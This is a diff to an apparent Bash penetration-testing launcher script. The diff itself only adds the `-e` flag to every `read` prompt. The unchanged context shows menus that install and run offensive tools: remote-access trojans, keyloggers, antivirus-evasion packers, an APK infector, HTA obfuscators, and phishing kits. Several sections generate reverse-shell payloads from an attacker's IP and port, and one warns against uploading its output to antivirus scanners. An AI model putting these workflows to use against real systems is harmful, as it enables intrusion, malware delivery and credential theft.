-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_websploit
@@ -3802,7 +3802,7 @@ function wifi_tools
 		if [[ -d /etc/openvas ]]
 		then
 			echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
-			read -p $'(\e[4;93mselect\e[0m)> ' SORS
+			read -e -p $'(\e[4;93mselect\e[0m)> ' SORS
 			if [[ "$SORS" == "start" ]]
 			then
 				netstat -nltp
@@ -3815,7 +3815,7 @@ function wifi_tools
 			fi
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_openvas
@@ -3830,7 +3830,7 @@ function wifi_tools
 			bash /usr/bin/ipscan & disown
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_angryip
@@ -3848,7 +3848,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_routersploit
@@ -3865,7 +3865,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_nwatch
@@ -3883,7 +3883,7 @@ function wifi_tools
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_eternalscanner
@@ -3898,7 +3898,7 @@ function wifi_tools
 			eaphammer_automation
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_eaphammer
@@ -3915,7 +3915,7 @@ function wifi_tools
 			./VMR-MDK-K2-2017R-012x2.sh
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_vmr
@@ -3932,7 +3932,7 @@ function wifi_tools
 			python2 netattack2.py
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_netattack2
@@ -3948,7 +3948,7 @@ function wifi_tools
 			wifi-pumpkin
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_wifi_pumpkin
@@ -3965,7 +3965,7 @@ function wifi_tools
 			python gloom.py
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_gloom
@@ -3981,7 +3981,7 @@ function wifi_tools
 			sechub
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_sechub
@@ -3998,7 +3998,7 @@ function wifi_tools
 			python SocialFish.py
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_socialfish
@@ -4024,7 +4024,7 @@ function wifi_tools
 			echo -e ""$YS" b"$CE") Go back"
 			echo -e ""$YS"00"$CE") Main menu"
 		#	echo -e ""$YS" 0"$CE") Exit"
-			read -p $'(\e[5;34mOSRFCONSOLE\e[0m)> ' OSFR
+			read -e -p $'(\e[5;34mOSRFCONSOLE\e[0m)> ' OSFR
 			clear
 				if [[ "$OSFR" = "1" ]]
 				then
@@ -4077,7 +4077,7 @@ function wifi_tools
 			done
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_osrframework
@@ -4308,7 +4308,7 @@ function remote_access
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	#echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;33mremote-access\e[0m)> ' KEYLOG
+	read -e -p $'(\e[4;33mremote-access\e[0m)> ' KEYLOG
 	clear
 	if [[ "$KEYLOG" = "1" ]]
 	then
@@ -4319,7 +4319,7 @@ function remote_access
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_beelogger
@@ -4336,7 +4336,7 @@ function remote_access
 			./entypreter
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_entypreter
@@ -4353,7 +4353,7 @@ function remote_access
 			./invader
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_invader
@@ -4369,7 +4369,7 @@ function remote_access
 			./Meterpreter_Paranoid_Mode.sh
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_meterpreter_paranoid_mode
@@ -4385,7 +4385,7 @@ function remote_access
 			dropit_automation
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_dropit_frmw
@@ -4401,7 +4401,7 @@ function remote_access
 			./Veil.py
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_veil
@@ -4417,7 +4417,7 @@ function remote_access
 			python leviathan.py
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_leviathan
@@ -4434,7 +4434,7 @@ function remote_access
 			./FakeImageExploiter.sh
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_fake_image
@@ -4450,7 +4450,7 @@ function remote_access
 			ls -1 build*
 			echo -e ""
 			echo -e "Type which one you want: "
-			read -p $'(\e[4;93mtype\e[0m)> ' AVE
+			read -e -p $'(\e[4;93mtype\e[0m)> ' AVE
 			if [[ ! -f /root/avet/build/"$AVE" ]]
 			then
 				echo -e ""$RS"File not found"$CE""
@@ -4465,7 +4465,7 @@ function remote_access
 			fi
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_avet
@@ -4481,7 +4481,7 @@ function remote_access
 			gnome-terminal -e "./ARCANUS & disown"
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_arcanus
@@ -4511,7 +4511,7 @@ function remote_access
 				echo -e ""$YS"13"$CE") Windows [.exe // .dll]"
 				echo -e ""$YS"ENTER"$CE") Windows [.exe // .dll]"
 				echo -e ""
-				read -p $'(\e[4;31inject\e[0m)> ' TYPE
+				read -e -p $'(\e[4;31inject\e[0m)> ' TYPE
 				if [[ "$TYPE" -le 13 && "$TYPE" -ge 1 ]]
 				then
 					if [[ "$TYPE" = 1 ]]
@@ -4567,15 +4567,15 @@ function remote_access
 				fi
 				clear
 				echo -e "LHOST: "
-				read -p $'(\e[4;93mlhost\e[0m)> ' MLHOST
+				read -e -p $'(\e[4;93mlhost\e[0m)> ' MLHOST
 				clear
 				echo -e "LPORT: "
-				read -p $'(\e[4;93mlport\e[0m)> ' MLPORT
+				read -e -p $'(\e[4;93mlport\e[0m)> ' MLPORT
 				clear
 				echo -e ""$YS" 1"$CE") CMD                      Smaller size but less features"
 				echo -e ""$YS" 2"$CE") MSF                      Bigger size but more features"
 				echo -e ""$YS"ENTER"$CE") MSF"
-				read -p $'(\e[4;33mport\e[0m)> ' CMDMSF
+				read -e -p $'(\e[4;33mport\e[0m)> ' CMDMSF
 				if [[ "$CMDMSF" = 1 ]]
 				then
 					MCMDMSF="CMD"
@@ -4586,7 +4586,7 @@ function remote_access
 				echo -e ""$YS" 1"$CE") Bind"
 				echo -e ""$YS" 2"$CE") Reverse"
 				echo -e ""$YS"ENTER"$CE") Reverse"
-				read -p $'(\e[4;33mport\e[0m)> ' BR
+				read -e -p $'(\e[4;33mport\e[0m)> ' BR
 				if [[ "$BR" = 1 ]]
 				then
 					MBR="BIND"
@@ -4597,7 +4597,7 @@ function remote_access
 				echo -e ""$YS" 1"$CE") Staged"
 				echo -e ""$YS" 2"$CE") Stageless"
 				echo -e ""$YS"ENTER"$CE") Staged"	
-				read -p $'(\e[4;33mport\e[0m)> ' SORS
+				read -e -p $'(\e[4;33mport\e[0m)> ' SORS
 				if [[ "$SORS" = 2 ]]
 				then
 					MSORS="STAGELESS"
@@ -4610,7 +4610,7 @@ function remote_access
 				echo -e ""$YS" 3"$CE") HTTPS"
 				echo -e ""$YS" 4"$CE") FIND_PORT"
 				echo -e ""$YS"ENTER"$CE") TCP"
-				read -p $'(\e[4;33mport\e[0m)> '  PRT
+				read -e -p $'(\e[4;33mport\e[0m)> '  PRT
 				if [[ "$PRT" = 2 ]]
 				then
 					MPRT="HTTP"
@@ -4629,7 +4629,7 @@ function remote_access
 			done
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_msfpc
@@ -4645,7 +4645,7 @@ function remote_access
 			do
 				clear
 				echo -e "Your file's path: "
-				read -p $'(\e[4;93mpath\e[0m)> ' FPATH
+				read -e -p $'(\e[4;93mpath\e[0m)> ' FPATH
 				if [[ ! -f "$FPATH" ]]
 				then
 					echo -e ""$RS"File does not exist"$CE""
@@ -4658,7 +4658,7 @@ function remote_access
 				echo -e ""$YS" 3"$CE") WmiPrvSE"
 				echo -e ""$YS"ENTER"$CE") Explorer"
 				echo -e "Choose technique to use:: "
-				read -p $'(\e[4;93mtechnique\e[0m)> ' MODE
+				read -e -p $'(\e[4;93mtechnique\e[0m)> ' MODE
 				if [[ "$MODE" = 1 ]]
 				then
 					MMODE="mshta"
@@ -4671,7 +4671,7 @@ function remote_access
 				clear
 				echo -e "Enter max length of randomly generated strings: "
 				echo -e ""$YS"ENTER"$CE") 1000"
-				read -p $'(\e[4;93mnumber\e[0m)> ' M1
+				read -e -p $'(\e[4;93mnumber\e[0m)> ' M1
 				if [[ "$M1" = "" ]]
 				then
 					M1=1000
@@ -4679,7 +4679,7 @@ function remote_access
 				clear
 				echo -e "Enter max length of randomly generated variable names: "
 				echo -e ""$YS"ENTER"$CE") 40"
-				read -p $'(\e[4;93mnumber\e[0m)> ' M2
+				read -e -p $'(\e[4;93mnumber\e[0m)> ' M2
 				if [[ "$M2" = "" ]]
 				then
 					M2=40
@@ -4687,7 +4687,7 @@ function remote_access
 				clear
 				echo -e "Enter max number of times values should be split in chr obfuscation: "
 				echo -e ""$YS"ENTER"$CE") 10"
-				read -p $'(\e[4;93mnumber\e[0m)> ' M3
+				read -e -p $'(\e[4;93mnumber\e[0m)> ' M3
 				if [[ "$M3" = "" ]]
 				then
 					M3=10
@@ -4695,7 +4695,7 @@ function remote_access
 				clear
 				echo -e "Enter value of each split: "
 				echo -e ""$YS"ENTER"$CE") 10"
-				read -p $'(\e[4;93mnumber\e[0m)> ' M4
+				read -e -p $'(\e[4;93mnumber\e[0m)> ' M4
 				if [[ "$M4" = "" ]]
 				then
 					M4=10
@@ -4705,7 +4705,7 @@ function remote_access
 					clear
 					echo -e "Enter file to output the morphed HTA to: "
 					echo -e ""$YS"ENTER"$CE") /root/Desktop/morph.HTA"
-					read -p $'(\e[4;93mfile\e[0m)> ' M5
+					read -e -p $'(\e[4;93mfile\e[0m)> ' M5
 					if [[ "$M5" = "" ]]
 					then
 						M5="/root/Desktop/morph.HTA"
@@ -4727,7 +4727,7 @@ function remote_access
 				cd
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_morphhta
@@ -4743,7 +4743,7 @@ function remote_access
 			python lfisuite.py
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_lfi
@@ -4759,7 +4759,7 @@ function remote_access
 			do
 				clear
 				echo -e "Path to raw shellcode file you want to use: "
-				read -p $'(\e[4;93mpath\e[0m)> ' RPATH
+				read -e -p $'(\e[4;93mpath\e[0m)> ' RPATH
 				if [[ ! -f "$RPATH" ]]
 				then
 					echo -e ""$RS"File not found"$CE""
@@ -4768,7 +4768,7 @@ function remote_access
 				fi
 				clear
 				echo -e "Name of output file: "
-				read -p $'(\e[4;93mname\e[0m)> ' OUT
+				read -e -p $'(\e[4;93mname\e[0m)> ' OUT
 				if [[ -f "$OUT" ]]
 				then
 					echo -e ""$RS"File already exists"$CE""
@@ -4780,7 +4780,7 @@ function remote_access
 				echo -e ""$YS" 1"$CE") Bypass"
 				echo -e ""$YS" 2"$CE") Just generate"
 				echo -e ""$YS"ENTER"$CE") Bypass"
-				read read -p $'(\e[5;33mexecutable\e[0m)> ' BORG
+				read read -e -p $'(\e[5;33mexecutable\e[0m)> ' BORG
 				clear
 				if [[ "$BORG" = 2 ]]
 				then
@@ -4788,7 +4788,7 @@ function remote_access
 						echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
 						echo -e ""$YS" 3"$CE") process-evasion.json"
 						echo -e ""$YS"ENTER"$CE") process-evasion.json"
-						read -p $'(\e[5;33mprocess\e[0m)> ' CONF
+						read -e -p $'(\e[5;33mprocess\e[0m)> ' CONF
 						if [[ "$CONF" = 1 ]]
 						then
 							FC="domain.json"
@@ -4829,7 +4829,7 @@ function remote_access
 						#~ break
 					#~ else
 						echo -e "Path to mingw32-gcc.exe: "
- 						read -p $'(\e[4;93mpath\e[0m)> ' PGCC
+ 						read -e -p $'(\e[4;93mpath\e[0m)> ' PGCC
 						#~ if [[ "$PGCC" = "" ]]
 						#~ then
 							#~ PGCC="$GCC"
@@ -4839,7 +4839,7 @@ function remote_access
 						echo -e ""$YS" 2"$CE") process-and-time-evasion.json"
 						echo -e ""$YS" 3"$CE") process-evasion.json"
 						echo -e ""$YS"ENTER"$CE") process-evasion.json"
-						read -p $'(\e[5;33mprocess\e[0m)> ' CONF
+						read -e -p $'(\e[5;33mprocess\e[0m)> ' CONF
 						if [[ "$CONF" = 1 ]]
 						then
 							FC="domain.json"
@@ -4859,7 +4859,7 @@ function remote_access
 			python UniByAv*.py
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_unibyav
@@ -4876,14 +4876,14 @@ function remote_access
 			do
 				clear
 				echo -e "Encryption key: "
-				read -p $'(\e[4;93mkey\e[0m)> ' ENC
+				read -e -p $'(\e[4;93mkey\e[0m)> ' ENC
 				clear
 				echo -e ""$YS" 1"$CE") ShellBrowserWindow"
 				echo -e ""$YS" 2"$CE") Outlook.Application"
 				echo -e ""$YS" 3"$CE") Excel.RegisterXLL"
 				echo -e ""$YS" 4"$CE") WbemScripting.SWbemLocator"
 				echo -e "Choose payload type: "
-				read -p $'(\e[4;93mtype\e[0m)> ' PT
+				read -e -p $'(\e[4;93mtype\e[0m)> ' PT
 				if [[ "$PT" -le 4 && "$PT" -ge 1 ]]
 				then
 					if [[ "$PT" = 1 ]]
@@ -4901,7 +4901,7 @@ function remote_access
 					fi
 					clear
 					echo -e "Command to run from HTA: "
-					read -p $'(\e[4;93mcommand\e[0m)> ' CHTA
+					read -e -p $'(\e[4;93mcommand\e[0m)> ' CHTA
 					if [[ "$CHTA" = "" ]]
 					then
 						CCHTA=""
@@ -4910,7 +4910,7 @@ function remote_access
 					fi
 					clear
 					echo -e "Output file name: "
-					read -p $'(\e[4;93mname\e[0m)> ' FN
+					read -e -p $'(\e[4;93mname\e[0m)> ' FN
 					cd /root/demiguise
 					python demiguise.py -k "$ENC" -p "$PTT" "$CCHTA" -o "$FN"
 					if [[ -f /root/demiguise/$FN ]]
@@ -4931,7 +4931,7 @@ function remote_access
 			done
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_demiguise
@@ -4947,7 +4947,7 @@ function remote_access
 			python dkmc.py
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_dkmc
@@ -4963,7 +4963,7 @@ function remote_access
 			./beef
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_beef
@@ -4979,7 +4979,7 @@ function remote_access
 			./evil-droid
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_evil_droid
@@ -4995,7 +4995,7 @@ function remote_access
 			python mouse.py
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_mouse
@@ -5011,7 +5011,7 @@ function remote_access
 			python zerodoor.py
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_zerodoor
@@ -5027,7 +5027,7 @@ function remote_access
 			cromos_menu
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_cromos
@@ -5042,7 +5042,7 @@ function remote_access
 			arissploit
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_arissploit
@@ -5058,7 +5058,7 @@ function remote_access
 			python enigma.py
 		else	
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_enigma
@@ -5074,7 +5074,7 @@ function remote_access
 			go run CHAOS.go
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_chaos
@@ -5118,12 +5118,12 @@ function remote_access
 				echo -e ""$YS" 5"$CE") Add additional permissions         CURRENT:$APKPERM"
 				echo -e ""$YS" b"$CE") Go back"
 				echo -e ""$YS" run"$CE") Infect apk"
-				read -p $'(\e[4;31minfection\e[0m)> ' APKK
+				read -e -p $'(\e[4;31minfection\e[0m)> ' APKK
 				clear
 				if [[ "$APKK" = 1 ]]
 				then
 					echo -e "Apk to infect(must be in /root/kwetza): "
-					read -p $'(\e[4;93mapk\e[0m)> ' APKTBI
+					read -e -p $'(\e[4;93mapk\e[0m)> ' APKTBI
 					if [[ -f "$APKTBI" ]]
 					then
 						APK="$APKTBI"
@@ -5134,11 +5134,11 @@ function remote_access
 				elif [[ "$APKK" = 2 ]]
 				then
 					echo -e "LHOST: "
-					read -p $'(\e[4;93mlhost\e[0m)> ' APKLH
+					read -e -p $'(\e[4;93mlhost\e[0m)> ' APKLH
 				elif [[ "$APKK" = 3 ]]
 				then
 					echo -e "LPORT: "
-					read -p $'(\e[4;93mlport\e[0m)> ' APKLP
+					read -e -p $'(\e[4;93mlport\e[0m)> ' APKLP
 				elif [[ "$APKK" = 4 ]]
 				then
 					if [[ "$APKPROT" = "tcp" ]]
@@ -5186,7 +5186,7 @@ function remote_access
 			done
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_kwetza
@@ -5201,7 +5201,7 @@ function remote_access
 			shellter
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_shellter
@@ -5223,7 +5223,7 @@ function remote_access
 			exec bash "$0"
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_ezsploit
@@ -5243,7 +5243,7 @@ function remote_access
 			echo -e ""$YS" b"$CE") Go back"
 			echo -e ""$YS"00"$CE") Main menu"
 			echo -e ""$YS" 0"$CE") Exit"
-			read -p $'(\e[4;93mpupy\e[0m)> ' PUPY
+			read -e -p $'(\e[4;93mpupy\e[0m)> ' PUPY
 			if [[ "$PUPY" = "1" ]]
 			then
 				clear
@@ -5251,7 +5251,7 @@ function remote_access
 				echo -e ""$YS" 1"$CE") Windows"
 				echo -e ""$YS" 2"$CE") Linux"
 				echo -e ""$YS" 3"$CE") Android"
-				read -p $'(\e[4;31mtarget\e[0m)> ' TAROS
+				read -e -p $'(\e[4;31mtarget\e[0m)> ' TAROS
 				if [[ "$TAROS" = "1" ]]
 				then
 					TAROS="windows"
@@ -5268,13 +5268,13 @@ function remote_access
 				fi
 				clear
 				echo -e "Enter your ip: "
-				read -p $'(\e[4;93mIP\e[0m)> ' PUPYIP
+				read -e -p $'(\e[4;93mIP\e[0m)> ' PUPYIP
 				clear
 				echo -e "Enter your port(e.g: 443): "
-				read -p $'(\e[4;93mport\e[0m)> ' PUPYPORT
+				read -e -p $'(\e[4;93mport\e[0m)> ' PUPYPORT
 				clear
 				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
-				read -p $'(\e[4;93mpath\e[0m)> ' PUPYPATH
+				read -e -p $'(\e[4;93mpath\e[0m)> ' PUPYPATH
 				cd /root/pupy/pupy
 				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
 				cd
@@ -5302,7 +5302,7 @@ function remote_access
 			done
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_pupy
@@ -5318,7 +5318,7 @@ function remote_access
 			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
 			sleep 3
 			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
-			read -p $'(\e[4;93magree\e[0m)> ' MUSTBEYES
+			read -e -p $'(\e[4;93magree\e[0m)> ' MUSTBEYES
 			if [[ "$MUSTBEYES" = "YES" ]] 
 			then 
 				clear
@@ -5328,7 +5328,7 @@ function remote_access
 			fi
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_zirikatu
@@ -5343,7 +5343,7 @@ function remote_access
 			fatrat
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_thefatrat
@@ -5360,7 +5360,7 @@ function remote_access
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_winpayloads
@@ -5443,19 +5443,19 @@ function information_gathering
 		fi
 		echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS"00"$CE") Main menu"
-		read -p $'(\e[4;33minfog\e[0m)> ' INFOG
+		read -e -p $'(\e[4;33minfog\e[0m)> ' INFOG
 		clear
 		if [[ "$INFOG" = 1 ]]
 		then
 			if [[ -d /usr/share/sniper ]]
 			then
 				echo -e "Enter the domain you want to scan: "
-				read -p $'(\e[4;34mdomain\e[0m)> ' DOMAIN
+				read -e -p $'(\e[4;34mdomain\e[0m)> ' DOMAIN
 				clear
 				sniper $DOMAIN
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_sniper
@@ -5472,7 +5472,7 @@ function information_gathering
 				cd
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_recondog
@@ -5489,7 +5489,7 @@ function information_gathering
 				cd
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_redhawk
@@ -5503,9 +5503,9 @@ function information_gathering
 			if [[ -d /root/Infoga ]]
 			then
 				echo -e "Domain to search:"
-				read -p $'(\e[4;34mdomain\e[0m)> ' INFOTARG
+				read -e -p $'(\e[4;34mdomain\e[0m)> ' INFOTARG
 				echo -e "Data source(e.g. "$YS"all"$CE","$YS"google"$CE","$YS"bing"$CE","$YS"yahoo"$CE","$YS"pgp"$CE"): "
-				read -p $'(\e[4;93msource\e[0m)> ' INFOSOUR
+				read -e -p $'(\e[4;93msource\e[0m)> ' INFOSOUR
 				clear
 				cd /root/Infoga
 				python infoga.py -t $INFOTARG -s $INFOSOUR 
@@ -5514,7 +5514,7 @@ function information_gathering
 				cd
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
